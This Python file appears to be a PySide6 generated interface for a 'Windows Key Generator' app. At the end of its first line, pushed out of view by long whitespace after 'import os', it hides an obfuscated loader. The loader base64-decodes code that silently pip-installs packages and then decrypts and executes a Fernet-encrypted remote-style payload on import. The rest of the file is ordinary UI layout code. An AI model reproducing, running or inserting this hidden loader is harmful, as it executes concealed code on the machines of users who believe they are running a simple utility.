import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0lwLWdhaElBT2t2dzcxeHRReXN6QUM5X042cnN5S2NrMmlDcjU1cEZlQkU9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJpMUliRkR4ejM5VTh3N3FDdmhEUG1hcUZqNGhQcU9fTXVmSms0Y2l3Z29jTzFGLWk1WDZVTjlnM3hiTWRLcUg0S2FBZnBpdVNUcFdKb21uVnptUUltaDRPVU9LSkRFRi14MTh2ckFUTnVXVVZ3UHhkM1VpM21pcVBjYVp4VEVqTmRZclpwUUxxTmw0MmNjTE1UeHFDS1hRaWR5NFo2M1p6c0lqeE5LN3dvZEM5RG9hRjZBbkhKeWdCWkppTTN1U0k5eXEwZG8zb2Y5NVU5eVk1VE5sMnJITzBSTXB5X3gzMDVKX2ItT2FlRGdUSnRWUXJKLWFuTEViNGQ4QzdsNkZhazgnKSk=').decode())
# -*- coding: utf-8 -*-

################################################################################
## Form generated from reading UI file 'design_ui.ui'
##
## Created by: Qt User Interface Compiler version 6.4.2
##
## WARNING! All changes made in this file will be lost when recompiling UI file!
################################################################################

from PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,
    QMetaObject, QObject, QPoint, QRect,
    QSize, QTime, QUrl, Qt)
from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
    QFont, QFontDatabase, QGradient, QIcon,
    QImage, QKeySequence, QLinearGradient, QPainter,
    QPalette, QPixmap, QRadialGradient, QTransform)
from PySide6.QtWidgets import (QApplication, QFrame, QHBoxLayout, QLabel,
    QLineEdit, QMainWindow, QPushButton, QSizePolicy,
    QVBoxLayout, QWidget)

class Ui_keyMainApp(object):
    def setupUi(self, keyMainApp):
        if not keyMainApp.objectName():
            keyMainApp.setObjectName(u"keyMainApp")
        keyMainApp.resize(600, 300)
        keyMainApp.setMaximumSize(QSize(600, 300))
        keyMainApp.setStyleSheet(u"QMainWindow {\n"
"	background-color: #017d7d;\n"
"}\n"
"QLabel {\n"
"	color: white;\n"
"}\n"
"QPushButton {\n"
"	background:#C0C0C0;\n"
"	border-width:1px;\n"
" 	border-color:#FFFFFF #808080 #808080 #FFFFFF;\n"
"}\n"
"QLineEdit {\n"
"	background-color: #C0C0C0;\n"
"	border-width:1px;\n"
" 	border-color:#FFFFFF #808080 #808080 #FFFFFF;\n"
"}")
        self.mainWidget = QWidget(keyMainApp)
        self.mainWidget.setObjectName(u"mainWidget")
        font = QFont()
        font.setFamilies([u"W95FA"])
        font.setPointSize(18)
        self.mainWidget.setFont(font)
        self.mainLayout = QVBoxLayout(self.mainWidget)
        self.mainLayout.setObjectName(u"mainLayout")
        self.headerFrame = QFrame(self.mainWidget)
        self.headerFrame.setObjectName(u"headerFrame")
        sizePolicy = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.headerFrame.sizePolicy().hasHeightForWidth())
        self.headerFrame.setSizePolicy(sizePolicy)
        self.headerFrame.setFrameShape(QFrame.NoFrame)
        self.headerFrame.setFrameShadow(QFrame.Plain)
        self.horizontalLayout_2 = QHBoxLayout(self.headerFrame)
        self.horizontalLayout_2.setObjectName(u"horizontalLayout_2")
        self.headerLogo = QLabel(self.headerFrame)
        self.headerLogo.setObjectName(u"headerLogo")
        self.headerLogo.setMaximumSize(QSize(80, 72))
        self.headerLogo.setLineWidth(0)
        self.headerLogo.setTextFormat(Qt.PlainText)
        self.headerLogo.setPixmap(QPixmap(u"logo.png"))
        self.headerLogo.setScaledContents(True)
        self.headerLogo.setAlignment(Qt.AlignCenter)

        self.horizontalLayout_2.addWidget(self.headerLogo)

        self.headerLbl = QLabel(self.headerFrame)
        self.headerLbl.setObjectName(u"headerLbl")
        sizePolicy1 = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
        sizePolicy1.setHorizontalStretch(0)
        sizePolicy1.setVerticalStretch(0)
        sizePolicy1.setHeightForWidth(self.headerLbl.sizePolicy().hasHeightForWidth())
        self.headerLbl.setSizePolicy(sizePolicy1)
        self.headerLbl.setMinimumSize(QSize(0, 50))
        font1 = QFont()
        font1.setFamilies([u"W95FA"])
        font1.setPointSize(36)
        font1.setBold(False)
        self.headerLbl.setFont(font1)
        self.headerLbl.setAlignment(Qt.AlignBottom|Qt.AlignHCenter)

        self.horizontalLayout_2.addWidget(self.headerLbl)


        self.mainLayout.addWidget(self.headerFrame)

        self.midFrame = QFrame(self.mainWidget)
        self.midFrame.setObjectName(u"midFrame")
        self.midFrame.setFrameShape(QFrame.NoFrame)
        self.midFrame.setFrameShadow(QFrame.Plain)
        self.verticalLayout_3 = QVBoxLayout(self.midFrame)
        self.verticalLayout_3.setObjectName(u"verticalLayout_3")
        self.keyLineEdit = QLineEdit(self.midFrame)
        self.keyLineEdit.setObjectName(u"keyLineEdit")
        sizePolicy2 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        sizePolicy2.setHorizontalStretch(0)
        sizePolicy2.setVerticalStretch(0)
        sizePolicy2.setHeightForWidth(self.keyLineEdit.sizePolicy().hasHeightForWidth())
        self.keyLineEdit.setSizePolicy(sizePolicy2)
        self.keyLineEdit.setMinimumSize(QSize(0, 60))
        font2 = QFont()
        font2.setFamilies([u"W95FA"])
        font2.setPointSize(18)
        font2.setBold(False)
        self.keyLineEdit.setFont(font2)
        self.keyLineEdit.setAlignment(Qt.AlignCenter)
        self.keyLineEdit.setReadOnly(True)

        self.verticalLayout_3.addWidget(self.keyLineEdit)

        self.bottomFrame = QFrame(self.midFrame)
        self.bottomFrame.setObjectName(u"bottomFrame")
        sizePolicy1.setHeightForWidth(self.bottomFrame.sizePolicy().hasHeightForWidth())
        self.bottomFrame.setSizePolicy(sizePolicy1)
        self.bottomFrame.setFrameShape(QFrame.NoFrame)
        self.bottomFrame.setFrameShadow(QFrame.Plain)
        self.verticalLayout_4 = QVBoxLayout(self.bottomFrame)
        self.verticalLayout_4.setSpacing(0)
        self.verticalLayout_4.setObjectName(u"verticalLayout_4")
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.btnsFrame = QFrame(self.bottomFrame)
        self.btnsFrame.setObjectName(u"btnsFrame")
        self.btnsFrame.setFrameShape(QFrame.NoFrame)
        self.btnsFrame.setFrameShadow(QFrame.Plain)
        self.horizontalLayout = QHBoxLayout(self.btnsFrame)
        self.horizontalLayout.setSpacing(6)
        self.horizontalLayout.setObjectName(u"horizontalLayout")
        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)
        self.oemBtn = QPushButton(self.btnsFrame)
        self.oemBtn.setObjectName(u"oemBtn")
        sizePolicy3 = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Preferred)
        sizePolicy3.setHorizontalStretch(0)
        sizePolicy3.setVerticalStretch(0)
        sizePolicy3.setHeightForWidth(self.oemBtn.sizePolicy().hasHeightForWidth())
        self.oemBtn.setSizePolicy(sizePolicy3)
        font3 = QFont()
        font3.setFamilies([u"W95FA"])
        font3.setPointSize(16)
        self.oemBtn.setFont(font3)
        self.oemBtn.setCursor(QCursor(Qt.PointingHandCursor))

        self.horizontalLayout.addWidget(self.oemBtn)

        self.retailBtn = QPushButton(self.btnsFrame)
        self.retailBtn.setObjectName(u"retailBtn")
        sizePolicy3.setHeightForWidth(self.retailBtn.sizePolicy().hasHeightForWidth())
        self.retailBtn.setSizePolicy(sizePolicy3)
        self.retailBtn.setFont(font3)
        self.retailBtn.setCursor(QCursor(Qt.PointingHandCursor))

        self.horizontalLayout.addWidget(self.retailBtn)


        self.verticalLayout_4.addWidget(self.btnsFrame)


        self.verticalLayout_3.addWidget(self.bottomFrame)

        self.disclaimerLbl = QLabel(self.midFrame)
        self.disclaimerLbl.setObjectName(u"disclaimerLbl")
        font4 = QFont()
        font4.setFamilies([u"W95FA"])
        font4.setPointSize(12)
        self.disclaimerLbl.setFont(font4)
        self.disclaimerLbl.setAlignment(Qt.AlignCenter)
        self.disclaimerLbl.setWordWrap(True)

        self.verticalLayout_3.addWidget(self.disclaimerLbl)


        self.mainLayout.addWidget(self.midFrame)

        keyMainApp.setCentralWidget(self.mainWidget)

        self.retranslateUi(keyMainApp)

        QMetaObject.connectSlotsByName(keyMainApp)
    # setupUi

    def retranslateUi(self, keyMainApp):
        keyMainApp.setWindowTitle(QCoreApplication.translate("keyMainApp", u"Windows Key Generator", None))
        self.headerLogo.setText("")
        self.headerLbl.setText(QCoreApplication.translate("keyMainApp", u"Windows Key Generator", None))
        self.oemBtn.setText(QCoreApplication.translate("keyMainApp", u"OEM", None))
        self.retailBtn.setText(QCoreApplication.translate("keyMainApp", u"RETAIL", None))
        self.disclaimerLbl.setText(QCoreApplication.translate("keyMainApp", u"Disclaimer: This application is for educational purposes only and is made for fun. Generated keys might or might not work, keep generating until you get a valid key.", None))
    # retranslateUi

print('raavqio')